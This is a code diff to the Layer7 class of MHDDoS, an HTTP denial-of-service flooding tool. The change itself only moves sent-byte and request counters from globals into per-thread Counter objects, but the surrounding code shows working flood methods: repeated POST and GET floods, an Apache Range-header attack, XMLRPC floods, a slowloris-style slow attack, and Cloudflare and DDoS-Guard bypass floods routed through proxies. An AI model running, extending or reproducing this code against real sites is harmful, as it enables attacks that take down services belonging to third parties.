@@ -22,6 +22,7 @@ from requests import Session
 from yarl import URL
 
 from MHDDoS.methods.tools import Tools
+from MHDDoS.utils.misc import Counter
 
 CTX: SSLContext = create_default_context(cafile=where())
 CTX.check_hostname = False
@@ -49,6 +50,8 @@ class Layer7(Thread):
     _rpc: int
     _synevent: Any
     SENT_FLOOD: Any
+    _requests_sent: Counter = None
+    _bytes_sent: Counter = None
 
     def __init__(self,
                  target: URL,
@@ -58,7 +61,9 @@ class Layer7(Thread):
                  synevent: Event = None,
                  useragents: Set[str] = None,
                  referers: Set[str] = None,
-                 proxies: Set[Proxy] = None) -> None:
+                 proxies: Set[Proxy] = None,
+                 bytes_sent_counter: Counter = None,
+                 requests_sent_counter: Counter = None):
         Thread.__init__(self, daemon=True)
         self.SENT_FLOOD = None
         self._synevent = synevent
@@ -110,8 +115,12 @@ class Layer7(Thread):
                          'Pragma: no-cache\r\n'
                          'Upgrade-Insecure-Requests: 1\r\n')
 
+        self._requests_sent = requests_sent_counter
+        self._bytes_sent = bytes_sent_counter
+
     def run(self) -> None:
-        if self._synevent: self._synevent.wait()
+        if self._synevent:
+            self._synevent.wait()
         self.select(self._method)
         while self._synevent.is_set():
             with suppress(Exception):
@@ -172,7 +181,7 @@ class Layer7(Thread):
             else "REQUESTS"
 
     def POST(self) -> None:
-        global BYTES_SENT, REQUESTS_SENT
+        # global BYTES_SENT, REQUESTS_SENT
         payload: bytes = self.generate_payload(
             ("Content-Length: 44\r\n"
              "X-Requested-With: XMLHttpRequest\r\n"
@@ -182,13 +191,13 @@ class Layer7(Thread):
             with self.open_connection() as s:
                 for _ in range(self._rpc):
                     if s.send(payload):
-                        REQUESTS_SENT += 1
-                        BYTES_SENT += len(payload)
+                        self._requests_sent += 1
+                        self._bytes_sent += len(payload)
         except Exception:
             s.close()
 
     def STRESS(self) -> None:
-        global BYTES_SENT, REQUESTS_SENT
+        # global BYTES_SENT, REQUESTS_SENT
         payload: bytes = self.generate_payload(
             (f"Content-Length: 524\r\n"
              "X-Requested-With: XMLHttpRequest\r\n"
@@ -198,13 +207,13 @@ class Layer7(Thread):
             with self.open_connection() as s:
                 for _ in range(self._rpc):
                     if s.send(payload):
-                        REQUESTS_SENT += 1
-                        BYTES_SENT += len(payload)
+                        self._requests_sent += 1
+                        self._bytes_sent += len(payload)
         except Exception:
             s.close()
 
     def COOKIES(self) -> None:
-        global BYTES_SENT, REQUESTS_SENT
+        # global BYTES_SENT, REQUESTS_SENT
         payload: bytes = self.generate_payload(
             "Cookie: _ga=GA%s;"
             " _gat=1;"
@@ -216,13 +225,13 @@ class Layer7(Thread):
             with self.open_connection() as s:
                 for _ in range(self._rpc):
                     if s.send(payload):
-                        REQUESTS_SENT += 1
-                        BYTES_SENT += len(payload)
+                        self._requests_sent += 1
+                        self._bytes_sent += len(payload)
         except Exception:
             s.close()
 
     def APACHE(self) -> None:
-        global BYTES_SENT, REQUESTS_SENT
+        # global BYTES_SENT, REQUESTS_SENT
         payload: bytes = self.generate_payload(
             "Range: bytes=0-,%s" % ",".join("5-%d" % i
                                             for i in range(1, 1024)))
@@ -230,13 +239,13 @@ class Layer7(Thread):
             with self.open_connection() as s:
                 for _ in range(self._rpc):
                     if s.send(payload):
-                        REQUESTS_SENT += 1
-                        BYTES_SENT += len(payload)
+                        self._requests_sent += 1
+                        self._bytes_sent += len(payload)
         except Exception:
             s.close()
 
     def XMLRPC(self) -> None:
-        global BYTES_SENT, REQUESTS_SENT
+        # global BYTES_SENT, REQUESTS_SENT
         payload: bytes = self.generate_payload(
             ("Content-Length: 345\r\n"
              "X-Requested-With: XMLHttpRequest\r\n"
@@ -252,36 +261,36 @@ class Layer7(Thread):
             with self.open_connection() as s:
                 for _ in range(self._rpc):
                     if s.send(payload):
-                        REQUESTS_SENT += 1
-                        BYTES_SENT += len(payload)
+                        self._requests_sent += 1
+                        self._bytes_sent += len(payload)
         except Exception:
             s.close()
 
     def PPS(self) -> None:
-        global BYTES_SENT, REQUESTS_SENT
+        # global BYTES_SENT, REQUESTS_SENT
         try:
             with self.open_connection() as s:
                 for _ in range(self._rpc):
                     if s.send(self._defaultpayload):
-                        REQUESTS_SENT += 1
-                        BYTES_SENT += len(self._defaultpayload)
+                        self._requests_sent += 1
+                        self._bytes_sent += len(self._defaultpayload)
         except Exception:
             s.close()
 
     def GET(self) -> None:
-        global BYTES_SENT, REQUESTS_SENT
+        # global BYTES_SENT, REQUESTS_SENT
         payload: bytes = self.generate_payload()
         try:
             with self.open_connection() as s:
                 for _ in range(self._rpc):
                     if s.send(payload):
-                        REQUESTS_SENT += 1
-                        BYTES_SENT += len(payload)
+                        self._requests_sent += 1
+                        self._bytes_sent += len(payload)
         except Exception:
             s.close()
 
     def BOT(self) -> None:
-        global BYTES_SENT, REQUESTS_SENT
+        # global BYTES_SENT, REQUESTS_SENT
         payload: bytes = self.generate_payload()
         p1, p2 = str.encode(
             "GET /robots.txt HTTP/1.1\r\n"
@@ -304,42 +313,42 @@ class Layer7(Thread):
             with self.open_connection() as s:
                 s.send(p1)
                 s.send(p2)
-                BYTES_SENT += len(p1 + p2)
-                REQUESTS_SENT += 2
+                self._bytes_sent += len(p1 + p2)
+                self._requests_sent += 2
 
                 for _ in range(self._rpc):
                     if s.send(payload):
-                        REQUESTS_SENT += 1
-                        BYTES_SENT += len(payload)
+                        self._requests_sent += 1
+                        self._bytes_sent += len(payload)
         except Exception:
             s.close()
 
     def EVEN(self) -> None:
-        global BYTES_SENT, REQUESTS_SENT
+        # global BYTES_SENT, REQUESTS_SENT
         payload: bytes = self.generate_payload()
         try:
             with self.open_connection() as s:
                 while s.send(payload) and s.recv(1):
-                    REQUESTS_SENT += 1
-                    BYTES_SENT += len(payload)
+                    self._requests_sent += 1
+                    self._bytes_sent += len(payload)
         except Exception:
             s.close()
 
     def OVH(self) -> None:
-        global BYTES_SENT, REQUESTS_SENT
+        # global BYTES_SENT, REQUESTS_SENT
         payload: bytes = self.generate_payload()
         try:
             with self.open_connection() as s:
                 for _ in range(min(self._rpc, 5)):
                     if s.send(payload):
-                        REQUESTS_SENT += 1
-                        BYTES_SENT += len(payload)
+                        self._requests_sent += 1
+                        self._bytes_sent += len(payload)
         except Exception:
             s.close()
 
     def CFB(self):
         pro = None
-        global BYTES_SENT, REQUESTS_SENT
+        # global BYTES_SENT, REQUESTS_SENT
         if self._proxies:
             pro = choice(self._proxies)
         try:
@@ -348,44 +357,44 @@ class Layer7(Thread):
                     if pro:
                         with s.get(self._target.human_repr(),
                                    proxies=pro.asRequest()) as res:
-                            REQUESTS_SENT += 1
-                            BYTES_SENT += Tools.sizeOfRequest(res)
+                            self._requests_sent += 1
+                            self._bytes_sent += Tools.sizeOfRequest(res)
                             continue
 
                     with s.get(self._target.human_repr()) as res:
-                        REQUESTS_SENT += 1
-                        BYTES_SENT += Tools.sizeOfRequest(res)
+                        self._requests_sent += 1
+                        self._bytes_sent += Tools.sizeOfRequest(res)
         except Exception:
             s.close()
 
     def CFBUAM(self):
-        global BYTES_SENT, REQUESTS_SENT
+        # global BYTES_SENT, REQUESTS_SENT
         payload: bytes = self.generate_payload()
         try:
             with self.open_connection() as s:
                 sleep(5.01)
                 for _ in range(self._rpc):
                     if s.send(payload):
-                        REQUESTS_SENT += 1
-                        BYTES_SENT += len(payload)
+                        self._requests_sent += 1
+                        self._bytes_sent += len(payload)
         except Exception:
             s.close()
 
     def AVB(self):
-        global BYTES_SENT, REQUESTS_SENT
+        # global BYTES_SENT, REQUESTS_SENT
         payload: bytes = self.generate_payload()
         try:
             with self.open_connection() as s:
                 for _ in range(self._rpc):
                     sleep(max(self._rpc / 1000, 1))
                     if s.send(payload):
-                        REQUESTS_SENT += 1
-                        BYTES_SENT += len(payload)
+                        self._requests_sent += 1
+                        self._bytes_sent += len(payload)
         except Exception:
             s.close()
 
     def DGB(self):
-        global BYTES_SENT, REQUESTS_SENT
+        # global BYTES_SENT, REQUESTS_SENT
         with create_scraper() as s:
             try:
                 for _ in range(min(self._rpc, 5)):
@@ -394,18 +403,18 @@ class Layer7(Thread):
                         pro = choice(self._proxies)
                         with s.get(self._target.human_repr(),
                                    proxies=pro.asRequest()) as res:
-                            REQUESTS_SENT += 1
-                            BYTES_SENT += Tools.sizeOfRequest(res)
+                            self._requests_sent += 1
+                            self._bytes_sent += Tools.sizeOfRequest(res)
                             continue
 
                     with s.get(self._target.human_repr()) as res:
-                        REQUESTS_SENT += 1
-                        BYTES_SENT += Tools.sizeOfRequest(res)
+                        self._requests_sent += 1
+                        self._bytes_sent += Tools.sizeOfRequest(res)
             except Exception:
                 s.close()
 
     def DYN(self):
-        global BYTES_SENT, REQUESTS_SENT
+        # global BYTES_SENT, REQUESTS_SENT
         payload: str | bytes = self._payload
         payload += "Host: %s.%s\r\n" % (PyRoxy.Tools.Random.rand_str(6),
                                         self._target.authority)
@@ -416,13 +425,13 @@ class Layer7(Thread):
             with self.open_connection() as s:
                 for _ in range(self._rpc):
                     if s.send(payload):
-                        REQUESTS_SENT += 1
-                        BYTES_SENT += len(payload)
+                        self._requests_sent += 1
+                        self._bytes_sent += len(payload)
         except Exception:
             s.close()
 
     def DOWNLOADER(self):
-        global BYTES_SENT, REQUESTS_SENT
+        # global BYTES_SENT, REQUESTS_SENT
         payload: str | bytes = self._payload
         payload += "Host: %s.%s\r\n" % (PyRoxy.Tools.Random.rand_str(6),
                                         self._target.authority)
@@ -433,15 +442,15 @@ class Layer7(Thread):
             with self.open_connection() as s:
                 for _ in range(self._rpc):
                     if s.send(payload):
-                        REQUESTS_SENT += 1
-                        BYTES_SENT += len(payload)
+                        self._requests_sent += 1
+                        self._bytes_sent += len(payload)
                         while 1:
                             sleep(.01)
                             data = s.recv(1)
                             if not data:
                                 break
                 s.send(b'0')
-                BYTES_SENT += 1
+                self._bytes_sent += 1
 
         except Exception:
             s.close()
@@ -457,18 +466,18 @@ class Layer7(Thread):
                     if pro:
                         with s.get(self._target.human_repr(),
                                    proxies=pro.asRequest()) as res:
-                            REQUESTS_SENT += 1
-                            BYTES_SENT += Tools.sizeOfRequest(res)
+                            self._requests_sent += 1
+                            self._bytes_sent += Tools.sizeOfRequest(res)
                             continue
 
                     with s.get(self._target.human_repr()) as res:
-                        REQUESTS_SENT += 1
-                        BYTES_SENT += Tools.sizeOfRequest(res)
+                        self._requests_sent += 1
+                        self._bytes_sent += Tools.sizeOfRequest(res)
         except Exception:
             s.close()
 
     def GSB(self):
-        global BYTES_SENT, REQUESTS_SENT
+        # global BYTES_SENT, REQUESTS_SENT
         payload = "%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
                                                 self._target.raw_path_qs,
                                                 PyRoxy.Tools.Random.rand_str(6))
@@ -491,13 +500,13 @@ class Layer7(Thread):
             with self.open_connection() as s:
                 for _ in range(self._rpc):
                     if s.send(payload):
-                        REQUESTS_SENT += 1
-                        BYTES_SENT += len(payload)
+                        self._requests_sent += 1
+                        self._bytes_sent += len(payload)
         except Exception:
             s.close()
 
     def NULL(self) -> None:
-        global BYTES_SENT, REQUESTS_SENT
+        # global BYTES_SENT, REQUESTS_SENT
         payload: str | bytes = self._payload
         payload += "Host: %s\r\n" % self._target.authority
         payload += "User-Agent: null\r\n"
@@ -508,13 +517,13 @@ class Layer7(Thread):
             with self.open_connection() as s:
                 for _ in range(self._rpc):
                     if s.send(payload):
-                        REQUESTS_SENT += 1
-                        BYTES_SENT += len(payload)
+                        self._requests_sent += 1
+                        self._bytes_sent += len(payload)
         except Exception:
             s.close()
 
     def SLOW(self):
-        global BYTES_SENT, REQUESTS_SENT
+        # global BYTES_SENT, REQUESTS_SENT
         payload: bytes = self.generate_payload()
         try:
             with self.open_connection() as s:
@@ -525,8 +534,8 @@ class Layer7(Thread):
                         keep = str.encode("X-a: %d\r\n" % randint(1, 5000))
                         if s.send(keep):
                             sleep(self._rpc / 15)
-                            REQUESTS_SENT += 1
-                            BYTES_SENT += len(keep)
+                            self._requests_sent += 1
+                            self._bytes_sent += len(keep)
                     break
         except Exception:
             s.close()
@@ -568,9 +577,12 @@ class Layer7(Thread):
             self._defaultpayload = (
                     self._defaultpayload +
                     "Host: %s\r\n\r\n" % self._target.authority).encode()
-        if name == "EVEN": self.SENT_FLOOD = self.EVEN
-        if name == "DOWNLOADER": self.SENT_FLOOD = self.DOWNLOADER
-        if name == "BOMB": self.SENT_FLOOD = self.BOMB
+        if name == "EVEN":
+            self.SENT_FLOOD = self.EVEN
+        if name == "DOWNLOADER":
+            self.SENT_FLOOD = self.DOWNLOADER
+        if name == "BOMB":
+            self.SENT_FLOOD = self.BOMB
 
     def BOMB(self):
         pro = choice(self._proxies)
